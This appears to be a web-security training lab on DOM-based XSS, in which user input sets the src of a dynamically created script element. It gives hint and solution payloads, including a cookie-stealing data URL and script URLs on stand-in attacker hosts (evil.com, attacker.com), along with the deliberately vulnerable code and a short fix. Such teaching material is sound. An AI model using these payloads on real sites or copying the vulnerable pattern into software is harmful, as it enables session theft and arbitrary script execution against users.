🔹 Lab #30 · DOM-Based XSS

Dynamic <script src> with User Parameter

Creating a <script> element with a user-controlled src attribute is EXTREMELY DANGEROUS - the remote script can execute any code!

WARNING: Dynamically adding a script tag with user-controlled src allows attackers to load and execute remote malicious scripts!

HOW DYNAMIC SCRIPT INJECTION WORKS:
• document.createElement('script') creates a new script element
• Setting script.src = userInput loads and executes remote code
• Attackers can host malicious JS on their own server
• NEVER let users control script src attributes!
Hints
  • data:text/javascript,alert('XSS') - Inline script via data URL
  • https://evil.com/malicious.js - Remote malicious script
  • The loaded script has full access to your page (DOM, cookies, etc.)

Solution

Working Payloads (script URLs):

  • data:text/javascript,alert('XSS') - Inline JavaScript via data URL
  • data:text/javascript,alert(document.cookie) - Steal cookies
  • https://attacker.com/xss.js - Remote malicious script
  • blob:... - Blob URL containing malicious code

Vulnerable Code:

let scriptUrl = document.getElementById('urlInput').value;
let script = document.createElement('script');
script.src = scriptUrl;
document.body.appendChild(script);  // Executes remote code!

Real-world attack scenario:

// Attacker-controlled parameter
let userLib = location.search.split('lib=')[1];
let script = document.createElement('script');
script.src = userLib;  // Could be https://evil.com/xss.js
document.head.appendChild(script);

Fix: Validate and sanitize script URLs. Better yet, never let users control script sources.
